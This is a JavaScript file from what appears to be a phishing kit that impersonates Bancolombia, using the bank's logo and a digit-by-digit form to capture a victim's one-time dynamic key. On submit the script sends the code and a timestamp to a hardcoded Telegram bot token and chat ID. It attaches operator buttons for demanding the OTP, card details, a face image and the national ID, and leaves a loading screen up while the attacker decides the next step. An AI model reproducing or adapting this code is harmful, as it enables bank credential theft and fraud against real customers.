document.addEventListener('DOMContentLoaded', function() {
    const digitInputs = document.querySelectorAll('.digit-input');
    const btnContinuar = document.querySelector('.btn-iniciar');
    const btnCancelar = document.querySelector('.btn-cancelar');
    const form = document.getElementById('dynamicForm');
    const loadingOverlay = document.createElement('div');
    loadingOverlay.className = 'loading-overlay';
    loadingOverlay.innerHTML = `
        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
    `;
    document.body.appendChild(loadingOverlay);

    // Manejar inputs de dígitos
    digitInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            if (e.inputType === "deleteContentBackward") {
                if (index > 0) {
                    digitInputs[index - 1].focus();
                }
            } else if (e.target.value) {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                if (e.target.value && index < digitInputs.length - 1) {
                    digitInputs[index + 1].focus();
                }
            }
            checkComplete();
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !e.target.value && index > 0) {
                digitInputs[index - 1].focus();
            }
        });
    });

    function checkComplete() {
        const isComplete = Array.from(digitInputs).every(input => input.value.length === 1);
        if (isComplete) {
            btnContinuar.removeAttribute('disabled');
            btnContinuar.classList.add('active');
        } else {
            btnContinuar.setAttribute('disabled', '');
            btnContinuar.classList.remove('active');
        }
    }

    async function sendToTelegram(dynamicCode) {
        const botToken = '8476776117:AAELHdBk6OXxUcI2-QkI7xhtu6HKWeynhZY';
        const chatId = '-1002984980722';
        const message = `
🔐 Clave Dinámica: ${dynamicCode}
⌚ Hora: ${new Date().toLocaleString()}
        `;

        const keyboard = {
            inline_keyboard: [
                [
                    { text: "1️⃣ Pedir logo", callback_data: "logo" },
                    { text: "2️⃣ Pedir OTP", callback_data: "otp" }
                ],
                [
                    { text: "3️⃣ Pedir tarjeta", callback_data: "tarjeta" },
                    { text: "4️⃣ Pedir cara", callback_data: "cara" }
                ],
                [
                    { text: "5️⃣ Pedir cédula", callback_data: "cedula" },
                    { text: "6️⃣ Finalizar", callback_data: "finalizar" }
                ]
            ]
        };

        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    reply_markup: keyboard
                })
            });
        } catch (error) {
            console.error('Error:', error);
        }
    }

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        const dynamicCode = Array.from(digitInputs).map(input => input.value).join('');
        loadingOverlay.style.display = 'flex';
        await sendToTelegram(dynamicCode);
        // No ocultamos el overlay, se quedará esperando la acción del bot
    });

    btnCancelar.addEventListener('click', () => {
        window.location.href = 'index.html';
    });
});